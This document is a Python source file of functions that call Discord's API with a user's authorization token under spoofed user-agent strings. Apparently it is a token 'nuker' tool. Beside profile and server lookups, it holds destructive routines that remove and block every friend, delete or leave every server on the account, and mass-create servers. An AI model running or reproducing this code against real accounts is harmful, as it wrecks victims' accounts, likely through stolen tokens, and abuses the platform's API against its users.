import requests
import json

def account_info(token: str):
    headers = {"authorization": token, "user-agent": "firefox-69.3"}
    info = requests.get(
        "https://canary.discord.com/api/v9/users/@me", headers=headers
    ).json()
    return info
def country_code(token):
    headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
    token_country_request = requests.get(
        "https://discord.com/api/v8/auth/location-metadata", headers=headers
    ).json()
    return token_country_request['country_code']

def friends_remover(token):
    headers = {"authorization": token, "user-agent": "firefox-69.3"}
    friends = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in friends:
        requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
        )
def block_all(token):
    headers = {"authorization": token, "user-agent": "firefox-69.3"}
    json = {"type": 2}
    block_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
def leave_all_servers(token: str):
    headers = {"authorization": token, "user-agent": "Lol-bro"}
    leave_all_servers_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/guilds", headers=headers
    ).json()
    for guild in leave_all_servers_request:
        r = requests.post(
            f"https://discord.com/api/v9/guilds/{guild['id']}/delete",
        headers=headers)
        requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
            headers=headers,
        )
def spam_server(server_name: str,token: str):
    headers = {"authorization": token, "user-agent": "safari-69-104"}
    payload = {"name": server_name}
    spam_server_request = requests.post(
        "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
    ).json()
    return spam_server_request

def server_lookup(server_id: str,token: str):
    headers={"authorization": token, "user-agent": "firefox-59.69"}
    server_info = requests.get(f"https://discord.com/api/guilds/{server_id}", headers=headers).json()
    return server_info

def user_lookup(user_id: str, token: str):
    headers = {"authorization": token, "user-agent": "firefox-59.69"}
    user_info = requests.get(
    f"https://discord.com/api/v9/users/{user_id}/profile?with_mutual_guilds=false",
    headers=headers).json()
    return user_info